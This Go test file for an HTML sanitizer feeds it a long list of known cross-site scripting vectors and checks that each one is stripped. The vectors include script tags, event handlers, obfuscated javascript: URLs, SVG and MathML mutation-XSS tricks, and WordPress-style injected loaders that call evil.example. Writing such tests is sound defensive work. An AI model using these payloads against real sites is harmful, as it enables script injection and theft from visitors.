package sanitize

import (
	"fmt"
	"testing"
)

const (
	scriptRemoved = "removed <script> element and its content"
	svgRemoved    = "removed <svg> element and its content"
	mathRemoved   = "removed <math> element and its content"
	imgX          = `removed <img> element: invalid src "x": ` + absolute
)

// jsHref returns the change for an a element whose href, u, is a javascript URL.
func jsHref(u string) string {
	return fmt.Sprintf(`removed href attribute of <a>: invalid URL %q: scheme "javascript" is not allowed`, u)
}

// attacks are known attacks on sanitizers, which both kinds sanitize alike.
var attacks = []sanitizeTest{
	// Scripts
	{name: "inline script", in: `<p>a<script>alert(1)</script>b</p>`, want: `<p>ab</p>`, changes: scriptRemoved},
	{name: "external script", in: `<script src="https://evil.example/x.js"></script>`, changes: scriptRemoved},
	{name: "script in upper case", in: `<SCRIPT SRC=//evil.example/x.js></SCRIPT>`, changes: scriptRemoved},
	{name: "script and a slash", in: `<script/xss src="https://evil.example/x.js"></script>`, changes: scriptRemoved},
	{name: "unclosed script", in: `<p>a<script>alert(1)`, want: `<p>a</p>`, changes: scriptRemoved},
	{
		name:    "script ended in its comment",
		in:      `<script>/*</script><img src=x onerror=alert(1)>*/</script>`,
		want:    `*/`,
		changes: scriptRemoved + "\n" + imgX,
	},
	{name: "script in a comment", in: `<p>a<!--<script>alert(1)</script>-->b</p>`, want: `<p>ab</p>`},
	{name: "script in a conditional comment", in: `<!--[if IE]><script>alert(1)</script><![endif]-->x`, want: `x`},
	{
		name:    "script in a downlevel-revealed conditional comment",
		in:      `<![if !IE]><script>alert(1)</script><![endif]>x`,
		want:    `x`,
		changes: scriptRemoved,
	},
	{
		name:    "split script name",
		in:      `<scr<script>ipt>alert(1)</scr</script>ipt>`,
		want:    `ipt&gt;alert(1)ipt&gt;`,
		changes: "removed <scr<script> element, keeping its content",
	},
	{
		name:    "split script name around a script",
		in:      `<scr<script>x</script>ipt>alert(1)</script>`,
		want:    `xipt&gt;alert(1)`,
		changes: "removed <scr<script> element, keeping its content",
	},
	{name: "script after a less-than sign", in: `<<script>alert(1)//<</script>`, want: `&lt;`, changes: scriptRemoved},
	{
		name:    "script that writes a script",
		in:      `<script>document.write('<scr'+'ipt src=https://evil.example/x.js></scr'+'ipt>')</script>`,
		changes: scriptRemoved,
	},

	// Event handlers
	{
		name:    "onerror",
		in:      `<img src="/a.jpg" onerror="alert(1)">`,
		want:    `<img src="/a.jpg">`,
		changes: "removed onerror attribute of <img>",
	},
	{name: "onerror with an invalid src", in: `<img src=x onerror=alert(1)>`, changes: imgX},
	{name: "onload of body", in: `<body onload="alert(1)">x`, want: `x`}, // the parser drops the body start tag
	{
		name:    "onclick",
		in:      `<p onclick="alert(1)">x</p>`,
		want:    `<p>x</p>`,
		changes: "removed onclick attribute of <p>",
	},
	{
		name:    "event handler in odd case",
		in:      `<IMG SRC="/a.jpg" OnErRoR="alert(1)">`,
		want:    `<img src="/a.jpg">`,
		changes: "removed onerror attribute of <img>",
	},
	{
		name:    "slashes between attributes",
		in:      `<img/src="/a.jpg"/onerror=alert(1)>`,
		want:    `<img src="/a.jpg">`,
		changes: "removed onerror attribute of <img>",
	},
	{
		name:    "slashes and an empty src",
		in:      `<img/src/onerror=alert(1)>`,
		changes: `removed <img> element: invalid src "": empty URL`,
	},
	{
		name:    "no space between attributes",
		in:      `<img src="/a.jpg"onerror=alert(1)>`,
		want:    `<img src="/a.jpg">`,
		changes: "removed onerror attribute of <img>",
	},
	{
		name:    "character reference in an attribute name",
		in:      `<img src="/a.jpg" onerror&#61;alert(1)>`,
		want:    `<img src="/a.jpg">`,
		changes: "removed onerror&#61;alert(1) attribute of <img>",
	},
	{
		name:    "onmouseover",
		in:      `<a href="/x" onmouseover=alert(1)>x</a>`,
		want:    `<a href="/x">x</a>`,
		changes: "removed onmouseover attribute of <a>",
	},
	{
		name: "focus events",
		in:   `<div onpointerenter="alert(1)" onfocusin="alert(1)" tabindex="0" autofocus>x</div>`,
		want: `<div>x</div>`,
		changes: "removed onpointerenter attribute of <div>\n" +
			"removed onfocusin attribute of <div>\n" +
			"removed tabindex attribute of <div>\n" +
			"removed autofocus attribute of <div>",
	},
	{
		name:    "ontoggle",
		in:      `<details open ontoggle=alert(1)><summary>s</summary>x</details>`,
		want:    `<details open=""><summary>s</summary>x</details>`,
		changes: "removed ontoggle attribute of <details>",
	},
	{name: "onload of svg", in: `<svg/onload=alert(1)>`, changes: svgRemoved},

	// URLs
	{name: "javascript URL", in: `<a href="javascript:alert(1)">x</a>`, want: `<a>x</a>`,
		changes: jsHref("javascript:alert(1)")},
	{name: "javascript URL in upper case", in: `<a href="JAVASCRIPT:alert(1)">x</a>`, want: `<a>x</a>`,
		changes: jsHref("JAVASCRIPT:alert(1)")},
	{name: "decimal character reference", in: `<a href="&#106;avascript:alert(1)">x</a>`, want: `<a>x</a>`,
		changes: jsHref("javascript:alert(1)")},
	{name: "hexadecimal character reference", in: `<a href="&#x6A;avascript:alert(1)">x</a>`, want: `<a>x</a>`,
		changes: jsHref("javascript:alert(1)")},
	{name: "character reference without a semicolon", in: `<a href="&#106avascript:alert(1)">x</a>`,
		want: `<a>x</a>`, changes: jsHref("javascript:alert(1)")},
	{name: "character reference with leading zeros", in: `<a href="&#0000106;avascript:alert(1)">x</a>`,
		want: `<a>x</a>`, changes: jsHref("javascript:alert(1)")},
	{name: "named character reference for the colon", in: `<a href="javascript&colon;alert(1)">x</a>`,
		want: `<a>x</a>`, changes: jsHref("javascript:alert(1)")},
	{name: "colon without a semicolon", in: `<a href="javascript&#58alert(1)">x</a>`, want: `<a>x</a>`,
		changes: jsHref("javascript:alert(1)")},
	{
		name: "every character as a reference",
		in: `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;` +
			`&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">x</a>`,
		want:    `<a>x</a>`,
		changes: jsHref("javascript:alert(1)"),
	},
	{name: "tab in the scheme", in: `<a href="java&#9;script:alert(1)">x</a>`, want: `<a>x</a>`,
		changes: jsHref("java\tscript:alert(1)")},
	{name: "line feed in the scheme", in: `<a href="java&#10;script:alert(1)">x</a>`, want: `<a>x</a>`,
		changes: jsHref("java\nscript:alert(1)")},
	{name: "carriage return in the scheme", in: `<a href="java&#13;script:alert(1)">x</a>`, want: `<a>x</a>`,
		changes: jsHref("java\rscript:alert(1)")},
	{name: "named line feed before the colon", in: `<a href="javascript&NewLine;:alert(1)">x</a>`,
		want: `<a>x</a>`, changes: jsHref("javascript\n:alert(1)")},
	{name: "leading spaces and control characters", in: `<a href=" &#14; javascript:alert(1)">x</a>`,
		want: `<a>x</a>`, changes: jsHref(" " + string(rune(14)) + " javascript:alert(1)")},
	{
		// U+FFFD replaces the NUL: browsers take the URL as relative, and Go does not parse it.
		name: "NUL before the scheme",
		in:   `<a href="&#0;javascript:alert(1)">x</a>`,
		want: `<a>x</a>`,
		changes: `removed href attribute of <a>: invalid URL "` + string(rune(0xFFFD)) + `javascript:alert(1)": ` +
			"invalid URL",
	},
	{
		// Browsers do not decode percent-encoded schemes; the URL is relative.
		name: "percent-encoded scheme",
		in:   `<a href="%6A%61%76%61%73%63%72%69%70%74:alert(1)">x</a>`,
		want: `<a>x</a>`,
		changes: `removed href attribute of <a>: invalid URL "%6A%61%76%61%73%63%72%69%70%74:alert(1)": ` +
			"invalid URL",
	},
	{
		name:    "vbscript URL",
		in:      `<a href="vbscript:msgbox(1)">x</a>`,
		want:    `<a>x</a>`,
		changes: `removed href attribute of <a>: invalid URL "vbscript:msgbox(1)": scheme "vbscript" is not allowed`,
	},
	{
		name: "data URL in a link",
		in:   `<a href="data:text/html,<script>alert(1)</script>">x</a>`,
		want: `<a>x</a>`,
		changes: `removed href attribute of <a>: invalid URL "data:text/html,<script>alert(1)</script>": ` +
			`scheme "data" is not allowed`,
	},
	{
		name: "data URL in an image",
		in:   `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
		changes: `removed <img> element: invalid src "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+": ` +
			`scheme "data" is not allowed`,
	},
	{
		name:    "javascript URL in an image",
		in:      `<IMG SRC=JaVaScRiPt:alert(1)>`,
		changes: `removed <img> element: invalid src "JaVaScRiPt:alert(1)": scheme "javascript" is not allowed`,
	},
	{
		name: "image attributes with URLs",
		in:   `<img src="/a.jpg" longdesc="javascript:alert(1)" usemap="#m" ismap>`,
		want: `<img src="/a.jpg">`,
		changes: "removed longdesc attribute of <img>\n" +
			"removed usemap attribute of <img>\n" +
			"removed ismap attribute of <img>",
	},
	{
		name: "protocol-relative and backslash hosts",
		in:   `<a href="//evil.example/">1</a><a href="\\evil.example/">2</a><a href="/\evil.example/">3</a>`,
		want: `<a>1</a><a>2</a><a>3</a>`,
		changes: `removed href attribute of <a>: invalid URL "//evil.example/": ` +
			"protocol-relative URLs are not allowed\n" +
			`removed href attribute of <a>: invalid URL "\\\\evil.example/": backslashes are not allowed` + "\n" +
			`removed href attribute of <a>: invalid URL "/\\evil.example/": backslashes are not allowed`,
	},

	// SVG and MathML, and mutation XSS: markup that parses differently once written and parsed again
	{name: "script in svg", in: `<svg><script>alert(1)</script></svg>`, changes: svgRemoved},
	{
		name:    "xlink in svg",
		in:      `<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">x</text></a></svg>`,
		changes: svgRemoved,
	},
	{name: "animation in svg", in: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`, changes: svgRemoved},
	{
		name:    "iframe in foreignObject",
		in:      `<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>`,
		changes: svgRemoved,
	},
	{name: "href of math", in: `<math href="javascript:alert(1)">x</math>`, changes: mathRemoved},
	{
		name:    "HTML in annotation-xml",
		in:      `<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>`,
		changes: mathRemoved,
	},
	{
		name:    "mXSS: style in mglyph in a table in mtext",
		in:      `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
		changes: mathRemoved,
	},
	{
		name:    "mXSS: img in the title of an img in svg style",
		in:      `<svg><style><img title="</style><img src onerror=alert(1)>">`,
		changes: svgRemoved + "\nremoved <img> element: missing src",
	},
	{
		name:    "mXSS: nested forms and mglyph",
		in:      `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`,
		changes: "removed <form> element, keeping its content\n" + mathRemoved,
	},
	{
		name:    "mXSS: textarea in svg in math",
		in:      `<math><mi><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">`,
		changes: mathRemoved,
	},
	{
		name: "mXSS: style in svg in math with misnested headings",
		in: `<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style>` +
			`<img src onerror=alert(1)>"></style></h1>`,
		changes: mathRemoved,
	},
	{
		name: "mXSS: p end tag in svg",
		in:   `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`,
		want: `<p></p>"&gt;`,
		changes: svgRemoved + "\n" +
			"removed <style> element and its content\n" +
			`removed <img> element: invalid src "1": ` + absolute,
	},
	{
		name:    "mXSS: p in svg",
		in:      `<svg><p><style><g title="</style><img src=x onerror=alert(1)>">`,
		want:    `<p>"&gt;</p>`,
		changes: svgRemoved + "\nremoved <style> element and its content\n" + imgX,
	},
	{
		name:    "mXSS: comment in style in mglyph",
		in:      `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">`,
		changes: mathRemoved,
	},

	// noscript and template
	{
		name:    "noscript content",
		in:      `<noscript><img src=x onerror=alert(1)></noscript>`,
		changes: "removed <noscript> element and its content",
	},
	{
		name:    "noscript end tag in an attribute",
		in:      `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
		want:    `"&gt;`,
		changes: "removed <noscript> element and its content\n" + imgX,
	},
	{
		name:    "style in noscript",
		in:      `<noscript><style></noscript><img src=x onerror=alert(1)></style>`,
		changes: "removed <noscript> element and its content\n" + imgX,
	},
	{
		name:    "template content",
		in:      `<template><img src=x onerror=alert(1)></template><p>visible</p>`,
		want:    `<p>visible</p>`,
		changes: "removed <template> element and its content",
	},
	{
		name:    "style in template",
		in:      `<template><style></template><img src=x onerror=alert(1)></style></template>`,
		changes: "removed <template> element and its content",
	},
	{
		name: "template in select",
		in: `<select><template><style><!--</style><a rel="--></style></template></select>` +
			`<img src=x onerror=alert(1)>">`,
		changes: "removed <select> element and its content",
	},

	// Unclosed tags and broken quotes
	{name: "unclosed attribute value", in: `<a href="/x onclick=alert(1)>x</a>`},
	{name: "unclosed title", in: `<p title="a>b`},
	{
		name:    "broken quotes",
		in:      `<a href='/x' title="a' onclick="alert(1)">x</a>`,
		want:    `<a href="/x" title="a&#39; onclick=">x</a>`,
		changes: `removed "alert(1)\"" attribute of <a>`,
	},
	{
		name: "markup in an attribute value",
		in:   `<div title="</div><script>alert(1)</script>">x</div>`,
		want: `<div title="&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;">x</div>`,
	},
	{
		name:    "no space before an event handler",
		in:      `<img src="/a.jpg" alt="x" title="y"onerror="alert(1)">`,
		want:    `<img src="/a.jpg" alt="x" title="y">`,
		changes: "removed onerror attribute of <img>",
	},
	{name: "unclosed elements", in: `<a href="/x"><b>unclosed`, want: `<a href="/x"><b>unclosed</b></a>`},

	// Styles
	{
		name:    "style element",
		in:      `<style>@import url(https://evil.example/x.css);</style>`,
		changes: "removed <style> element and its content",
	},
	{
		name:    "style attribute with a javascript URL",
		in:      `<div style="background-image:url(javascript:alert(1))">x</div>`,
		want:    `<div>x</div>`,
		changes: "removed style attribute of <div>",
	},
	{
		name:    "style attribute with expression and behavior",
		in:      `<p STYLE="width: expression(alert(1)); behavior:url(x.htc); -moz-binding:url(x.xml#xss)">x</p>`,
		want:    `<p>x</p>`,
		changes: "removed style attribute of <p>",
	},
	{
		name:    "link to a style sheet",
		in:      `<link rel="stylesheet" href="https://evil.example/x.css">`,
		changes: "removed <link> element",
	},

	// Elements of documents, plugins and forms
	{name: "base", in: `<base href="https://evil.example/">`, changes: "removed <base> element"},
	{
		name:    "meta refresh to a javascript URL",
		in:      `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
		changes: "removed <meta> element",
	},
	{
		name:    "meta refresh to another site",
		in:      `<meta http-equiv="refresh" content="0;url=https://evil.example/">`,
		changes: "removed <meta> element",
	},
	{
		name: "object",
		in: `<object data="https://evil.example/x.swf" type="application/x-shockwave-flash">` +
			`<param name="allowScriptAccess" value="always"><p>fallback</p></object>`,
		changes: "removed <object> element and its content",
	},
	{
		name:    "embed",
		in:      `<embed src="https://evil.example/x.swf" allowscriptaccess="always">`,
		changes: "removed <embed> element",
	},
	{
		name:    "applet",
		in:      `<applet code="X.class" codebase="https://evil.example/"><p>fallback</p></applet>`,
		changes: "removed <applet> element and its content",
	},
	{
		name: "form and formaction",
		in: `<form action="https://evil.example/login"><input name="password" type="password">` +
			`<button formaction="javascript:alert(1)">Log in</button></form>`,
		want: `Log in`,
		changes: "removed <form> element, keeping its content\n" +
			"removed <input> element\n" +
			"removed <button> element, keeping its content",
	},
	{
		name:    "button with formaction",
		in:      `<button formaction="javascript:alert(1)">x</button>`,
		want:    `x`,
		changes: "removed <button> element, keeping its content",
	},
	{
		name:    "isindex",
		in:      `<isindex action="javascript:alert(1)" type=image>`,
		changes: "removed <isindex> element, keeping its content",
	},
	// The parser drops the frameset and frame start tags in a div element.
	{name: "frameset", in: `<frameset onload=alert(1)><frame src="javascript:alert(1)"></frameset>`},

	// Text-only elements
	{
		name:    "xmp",
		in:      `<xmp><img src=x onerror=alert(1)></xmp>`,
		want:    `&lt;img src=x onerror=alert(1)&gt;`,
		changes: "removed <xmp> element, keeping its content",
	},
	{
		name:    "plaintext",
		in:      `<plaintext><img src=x onerror=alert(1)>`,
		want:    `&lt;img src=x onerror=alert(1)&gt;`,
		changes: "removed <plaintext> element, keeping its content",
	},
	{
		name:    "textarea",
		in:      `<textarea><img src=x onerror=alert(1)></textarea>`,
		changes: "removed <textarea> element and its content",
	},
	{
		name:    "title",
		in:      `<title><img src=x onerror=alert(1)></title>`,
		changes: "removed <title> element and its content",
	},
	{
		name:    "after textarea",
		in:      `<textarea></textarea><img src="/a.jpg" onerror=alert(1)>`,
		want:    `<img src="/a.jpg">`,
		changes: "removed <textarea> element and its content\nremoved onerror attribute of <img>",
	},
	{
		name:    "listing",
		in:      `<listing><img src=x onerror=alert(1)></listing>`,
		changes: "removed <listing> element, keeping its content\n" + imgX,
	},
	{
		name:    "noembed",
		in:      `<noembed><img src=x onerror=alert(1)></noembed>`,
		changes: "removed <noembed> element and its content",
	},

	// Spam links that were hidden: they are kept, and shown.
	{
		name:    "hidden spam link",
		in:      `<div style="display:none"><a href="https://spam.example/">cheap pills</a></div>`,
		want:    `<div><a href="https://spam.example/">cheap pills</a></div>`,
		changes: "removed style attribute of <div>",
	},
	{
		name:    "spam link moved off the page",
		in:      `<p style="position:absolute;left:-9999px">Read <a href="https://spam.example/">payday loans</a></p>`,
		want:    `<p>Read <a href="https://spam.example/">payday loans</a></p>`,
		changes: "removed style attribute of <p>",
	},
	{
		name:    "spam link in a hidden element",
		in:      `<span hidden><a href="https://spam.example/">casino</a></span>`,
		want:    `<span><a href="https://spam.example/">casino</a></span>`,
		changes: "removed hidden attribute of <span>",
	},
	{
		name:    "spam link in noscript",
		in:      `<noscript><a href="https://spam.example/">spam</a></noscript>`,
		changes: "removed <noscript> element and its content",
	},

	// What a hacked WordPress injects into posts
	{
		name:    "hacked WordPress: external script",
		in:      `<script type='text/javascript' src='https://evil.example/jquery.min.js?ver=3.6.0'></script>`,
		changes: scriptRemoved,
	},
	{
		name:    "hacked WordPress: eval(atob(...))",
		in:      `<script>eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7'))</script>`,
		changes: scriptRemoved,
	},
	{
		name: "hacked WordPress: obfuscated script",
		in: `<script>var _0x1a2b=["\x73\x63\x72\x69\x70\x74"];` +
			`document.write(unescape('%3Cscript src="https://evil.example/x.js"%3E%3C/script%3E'))</script>`,
		changes: scriptRemoved,
	},
	{
		// External images are allowed (6.12).
		name:    "hacked WordPress: 1x1 tracking image",
		in:      `<img src="https://evil.example/pixel.gif?u=1" width="1" height="1" alt="" style="display:none">`,
		want:    `<img src="https://evil.example/pixel.gif?u=1" width="1" height="1" alt="">`,
		changes: "removed style attribute of <img>",
	},
	{
		name: "hacked WordPress: injected spam and script",
		in: `<p>Post text</p><div style="display:none"><a href="https://spam.example/">viagra</a></div>` +
			`<script src="https://evil.example/x.js"></script>`,
		want:    `<p>Post text</p><div><a href="https://spam.example/">viagra</a></div>`,
		changes: "removed style attribute of <div>\n" + scriptRemoved,
	},
	{
		name:    "hacked WordPress: redirect on click",
		in:      `<a href="https://evil.example/" onclick="window.location='https://evil.example/'">x</a>`,
		want:    `<a href="https://evil.example/">x</a>`,
		changes: "removed onclick attribute of <a>",
	},
	{
		name: "hacked WordPress: eval in onload of body",
		in:   `<body onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">`,
	},

	// Links, classes and ids
	{
		name:    "new tab with opener",
		in:      `<a href="https://example.com/" target=_blank rel="opener">x</a>`,
		want:    `<a href="https://example.com/" target="_blank" rel="noopener">x</a>`,
		changes: `removed rel value "opener" of <a>`,
	},
	{
		name: "reserved classes",
		in:   `<div class="b-0paragr1 B-0PARAGR1 hl-1a2b3c4d">x</div>`,
		want: `<div>x</div>`,
		changes: `removed class "b-0paragr1" of <div>: reserved for the core` + "\n" +
			`removed class "B-0PARAGR1" of <div>: reserved for the core` + "\n" +
			`removed class "hl-1a2b3c4d" of <div>: reserved for the core`,
	},
	{
		// Options.ID decides on ids that other anchors of the page have.
		name: "ids like those of the core",
		in:   `<h2 id="b_0paragr1">x</h2><p id="__proto__">y</p>`,
		want: `<h2 id="b_0paragr1">x</h2><p id="__proto__">y</p>`,
	},
}

// mediaAttacks are known attacks with the elements that only the HTML kind keeps, with the output and the changes of
// each kind.
var mediaAttacks = []struct {
	name, in              string
	legacy, legacyChanges string
	html, htmlChanges     string
}{
	{
		name:          "javascript URL in an iframe",
		in:            `<iframe src="javascript:alert(1)"></iframe>`,
		legacyChanges: "removed <iframe> element and its content",
		htmlChanges: `removed <iframe> element: invalid src "javascript:alert(1)": ` +
			`scheme "javascript" is not allowed`,
	},
	{
		name:          "data URL in an iframe",
		in:            `<iframe src="data:text/html,<script>alert(1)</script>"></iframe>`,
		legacyChanges: "removed <iframe> element and its content",
		htmlChanges: `removed <iframe> element: invalid src "data:text/html,<script>alert(1)</script>": ` +
			`scheme "data" is not allowed`,
	},
	{
		name:          "srcdoc",
		in:            `<iframe src="https://example.com/" srcdoc="<script>alert(1)</script>"></iframe>`,
		legacyChanges: "removed <iframe> element and its content",
		html:          `<iframe src="https://example.com/"></iframe>`,
		htmlChanges:   "removed srcdoc attribute of <iframe>",
	},
	{
		name:          "iframe content",
		in:            `<iframe><img src=x onerror=alert(1)></iframe>`,
		legacyChanges: "removed <iframe> element and its content",
		htmlChanges:   "removed <iframe> element: missing src",
	},
	{
		name: "media URLs",
		in: `<video src="/v.mp4" poster="javascript:alert(1)" onloadstart="alert(1)"></video>` +
			`<video src="data:video/mp4,x"></video>`,
		legacyChanges: "removed <video> element and its content (2 times)",
		html:          `<video src="/v.mp4"></video><video></video>`,
		htmlChanges: `removed poster attribute of <video>: invalid URL "javascript:alert(1)": ` +
			`scheme "javascript" is not allowed` + "\n" +
			"removed onloadstart attribute of <video>\n" +
			`removed src attribute of <video>: invalid URL "data:video/mp4,x": scheme "data" is not allowed`,
	},
	{
		name:          "source without src",
		in:            `<video><source onerror="alert(1)"></video>`,
		legacyChanges: "removed <video> element and its content",
		html:          `<video></video>`,
		htmlChanges:   "removed <source> element: missing src",
	},
	{
		// Frames from https URLs are allowed in html blocks, which only administrators edit.
		name: "hacked WordPress: zero-size iframe",
		in: `<iframe src="https://evil.example/" width="0" height="0" frameborder="0" style="display:none">` +
			`</iframe>`,
		legacyChanges: "removed <iframe> element and its content",
		html:          `<iframe src="https://evil.example/" width="0" height="0"></iframe>`,
		htmlChanges:   "removed frameborder attribute of <iframe>\nremoved style attribute of <iframe>",
	},
}

// TestSanitizeAttacks checks the output and the changes of known attacks, and, with runTests, that only what the
// policy keeps is left (checkPolicy) and that sanitizing it again changes nothing.
func TestSanitizeAttacks(t *testing.T) {
	for _, kind := range []Kind{Legacy, HTML} {
		runTests(t, kind, attacks)
	}
	for _, tt := range mediaAttacks {
		runTests(t, Legacy, []sanitizeTest{{name: tt.name, in: tt.in, want: tt.legacy, changes: tt.legacyChanges}})
		runTests(t, HTML, []sanitizeTest{{name: tt.name, in: tt.in, want: tt.html, changes: tt.htmlChanges}})
	}
}
